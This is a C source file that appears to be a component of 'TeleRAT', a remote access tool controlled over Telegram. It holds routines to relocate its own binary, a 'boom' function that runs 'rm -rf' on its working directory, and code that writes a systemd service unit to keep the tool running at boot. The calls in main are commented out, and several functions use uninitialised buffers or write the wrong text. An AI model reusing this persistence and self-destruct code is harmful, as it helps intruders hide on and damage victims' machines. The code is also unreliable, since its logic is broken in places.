#include<stdio.h>
#include<string.h>
#include <unistd.h>
#include<stdlib.h> //atoi
struct cmdinfo{
    char nowPath[1024];
    char pName[250];
    char cmd[10000];
    char moveTo[2048];
};


//get Program Name
void getpName(char *pName){
    unsigned int len = strlen(pName);
    //parse ./move -> /move
    strncpy(pName,pName+1,len-1);
    //add null byte for stop string
    pName[len-1] ='\0';
}

//Get Now file location
void getNowPath(char *nowPath){

    if (getcwd(nowPath, 1024) == NULL)
       perror("getcwd() error");
}
void exeCMD(char *cmd){
    char buf[250];
    FILE *fp = popen(cmd, "r");

    while (fgets(buf, 200, fp))
    {
        printf("%s:",buf);
        bzero(cmd,200);
        bzero(buf,200); 
   }
   pclose(fp);
}


//parse path to command
void move(char *path){
    struct cmdinfo cmd;
    //Get now program location
    getNowPath(cmd.nowPath);

    printf("%s",cmd.nowPath);


    getpName(cmd.pName);
    //parse path to cmd
    sprintf(cmd.cmd,"mv %s%s %s%s",cmd.nowPath,cmd.pName,path,cmd.pName);
    // printf("%s",cmd.cmd);
    exeCMD(cmd.cmd);
}

void boom(char *path){
    struct cmdinfo cmd;
    getNowPath(cmd.nowPath);
    getpName(cmd.pName);
    sprintf(cmd.cmd,"rm -rf %s",cmd.nowPath);
    exeCMD(cmd.cmd);
}


void serviceSetting(){
    struct cmdinfo cmd;   
    getNowPath(cmd.nowPath);
    getpName(cmd.pName);
	//Connect path with program	
	sprintf(cmd.cmd,"%s%s",cmd.nowPath,cmd.pName);
	
	//writing in /etc/systemd/system
	FILE *f = fopen("/etc/systemd/system/TeleRAT.service","w");
	if(f == NULL)
	{
	   printf("Error can't open file");
	   exit(1);
	}
    char *text = malloc(sizeof(cmd.cmd));
	
	sprintf(text,"[Unit]\n"
		"Description = TeleRAT Remote Administrator Via Telegram\n\n"
        "[Service]\n"
	    "ExecStart =%s\n\n"
		"[Install]\n"
	    "WantedBy=multi-user.target\n\n",cmd.cmd);
	fprintf(f,"%s",cmd.cmd);
}

int main(int argc , char *argv[]){

    struct cmdinfo cmd;
    strcpy(cmd.pName,argv[0]);
    strcpy(cmd.moveTo,argv[1]);


    // move(cmd.moveTo);
    // path = boom(cmd.pName);
    // serviceSetting(); 



    return 0;
}